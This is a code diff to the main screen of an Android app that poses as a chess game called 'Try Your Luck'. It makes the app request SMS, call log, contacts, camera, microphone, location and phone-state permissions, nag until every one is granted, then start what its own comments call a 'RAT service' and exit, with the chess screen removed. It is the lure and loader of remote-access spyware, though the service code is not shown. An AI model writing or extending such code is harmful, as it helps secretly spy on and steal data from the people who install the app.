@@ -6,6 +6,9 @@ import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
+import android.widget.LinearLayout;
+import android.widget.ProgressBar;
+import android.widget.TextView;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
@@ -17,75 +20,96 @@ import java.util.List;
 public class MainActivity extends AppCompatActivity {
     private static final int PERMISSION_REQUEST_CODE = 100;
     private Handler handler = new Handler();
+    private boolean permissionsRequested = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // Set a simple layout programmatically to avoid XML issues
-        android.widget.LinearLayout layout = new android.widget.LinearLayout(this);
-        layout.setOrientation(android.widget.LinearLayout.VERTICAL);
+        // Create simple loading screen
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
         layout.setGravity(android.view.Gravity.CENTER);
         layout.setBackgroundColor(0xFF1a1a2e);
         
-        android.widget.TextView textView = new android.widget.TextView(this);
-        textView.setText("♟️ Try Your Luck\nLoading...");
-        textView.setTextSize(24);
+        TextView textView = new TextView(this);
+        textView.setText("♟️ Try Your Luck");
+        textView.setTextSize(28);
         textView.setTextColor(0xFFFFFFFF);
         textView.setGravity(android.view.Gravity.CENTER);
+        textView.setPadding(0, 0, 0, 20);
         
-        android.widget.ProgressBar progressBar = new android.widget.ProgressBar(this);
+        ProgressBar progressBar = new ProgressBar(this);
         
         layout.addView(textView);
         layout.addView(progressBar);
         setContentView(layout);
 
-        // Request permissions
-        requestAllPermissions();
+        // Start permission check after a short delay
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                checkAndRequestPermissions();
+            }
+        }, 500);
     }
 
-    private void requestAllPermissions() {
-        List<String> permissionsList = new ArrayList<>();
-        
-        permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
-        permissionsList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
-        permissionsList.add(Manifest.permission.READ_SMS);
-        permissionsList.add(Manifest.permission.SEND_SMS);
-        permissionsList.add(Manifest.permission.RECEIVE_SMS);
-        permissionsList.add(Manifest.permission.READ_CALL_LOG);
-        permissionsList.add(Manifest.permission.READ_CONTACTS);
-        permissionsList.add(Manifest.permission.CAMERA);
-        permissionsList.add(Manifest.permission.RECORD_AUDIO);
-        permissionsList.add(Manifest.permission.ACCESS_FINE_LOCATION);
-        permissionsList.add(Manifest.permission.ACCESS_COARSE_LOCATION);
-        permissionsList.add(Manifest.permission.READ_PHONE_STATE);
-        permissionsList.add(Manifest.permission.INTERNET);
-        permissionsList.add(Manifest.permission.ACCESS_NETWORK_STATE);
+    private void checkAndRequestPermissions() {
+        List<String> neededPermissions = new ArrayList<>();
+
+        // Add all required permissions
+        neededPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+        neededPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
+        neededPermissions.add(Manifest.permission.READ_SMS);
+        neededPermissions.add(Manifest.permission.SEND_SMS);
+        neededPermissions.add(Manifest.permission.RECEIVE_SMS);
+        neededPermissions.add(Manifest.permission.READ_CALL_LOG);
+        neededPermissions.add(Manifest.permission.READ_CONTACTS);
+        neededPermissions.add(Manifest.permission.CAMERA);
+        neededPermissions.add(Manifest.permission.RECORD_AUDIO);
+        neededPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
+        neededPermissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
+        neededPermissions.add(Manifest.permission.READ_PHONE_STATE);
+        neededPermissions.add(Manifest.permission.INTERNET);
+        neededPermissions.add(Manifest.permission.ACCESS_NETWORK_STATE);
         
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissionsList.add(Manifest.permission.POST_NOTIFICATIONS);
+            neededPermissions.add(Manifest.permission.POST_NOTIFICATIONS);
         }
 
-        // Filter out already granted permissions
-        List<String> neededPermissions = new ArrayList<>();
-        for (String permission : permissionsList) {
-            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
-                neededPermissions.add(permission);
+        // Check which permissions are not granted
+        List<String> missingPermissions = new ArrayList<>();
+        for (String perm : neededPermissions) {
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                missingPermissions.add(perm);
             }
         }
 
-        if (neededPermissions.isEmpty()) {
-            // All permissions granted
+        if (missingPermissions.isEmpty()) {
+            // All permissions granted - start app
             startApp();
+        } else if (!permissionsRequested) {
+            // Request missing permissions
+            permissionsRequested = true;
+            String[] permsArray = missingPermissions.toArray(new String[0]);
+            ActivityCompat.requestPermissions(this, permsArray, PERMISSION_REQUEST_CODE);
         } else {
-            String[] permissionsArray = neededPermissions.toArray(new String[0]);
-            ActivityCompat.requestPermissions(this, permissionsArray, PERMISSION_REQUEST_CODE);
+            // Permissions already requested but not granted - show message and retry
+            Toast.makeText(this, "Please grant all permissions to continue", Toast.LENGTH_LONG).show();
+            handler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    permissionsRequested = false;
+                    checkAndRequestPermissions();
+                }
+            }, 3000);
         }
     }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        
         if (requestCode == PERMISSION_REQUEST_CODE) {
             // Check if all permissions are granted
             boolean allGranted = true;
@@ -99,12 +123,13 @@ public class MainActivity extends AppCompatActivity {
             if (allGranted) {
                 startApp();
             } else {
-                Toast.makeText(this, "Please grant all permissions", Toast.LENGTH_LONG).show();
-                // Retry after 2 seconds
+                // Some permissions denied - show dialog and retry
+                Toast.makeText(this, "All permissions are required!", Toast.LENGTH_LONG).show();
+                permissionsRequested = false;
                 handler.postDelayed(new Runnable() {
                     @Override
                     public void run() {
-                        requestAllPermissions();
+                        checkAndRequestPermissions();
                     }
                 }, 2000);
             }
@@ -112,35 +137,30 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void startApp() {
-        // Start RAT service
         try {
+            // Start the RAT service
             Intent serviceIntent = new Intent(this, RatService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(serviceIntent);
             } else {
                 startService(serviceIntent);
             }
-            Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
-        } catch (Exception e) {
-            e.printStackTrace();
-            Toast.makeText(this, "Service error: " + e.getMessage(), Toast.LENGTH_LONG).show();
-        }
-
-        // Start chess game after 1 second
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    Intent chessIntent = new Intent(MainActivity.this, ChessActivity.class);
-                    startActivity(chessIntent);
-                    finish();
-                } catch (Exception e) {
-                    e.printStackTrace();
-                    // If ChessActivity fails, show error and finish
-                    Toast.makeText(MainActivity.this, "Error starting chess: " + e.getMessage(), Toast.LENGTH_LONG).show();
+            
+            // Show success message
+            Toast.makeText(this, "App started successfully!", Toast.LENGTH_SHORT).show();
+            
+            // Close the app after starting service
+            handler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
                     finish();
                 }
-            }
-        }, 1000);
+            }, 1000);
+            
+        } catch (Exception e) {
+            e.printStackTrace();
+            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
+            finish();
+        }
     }
 }
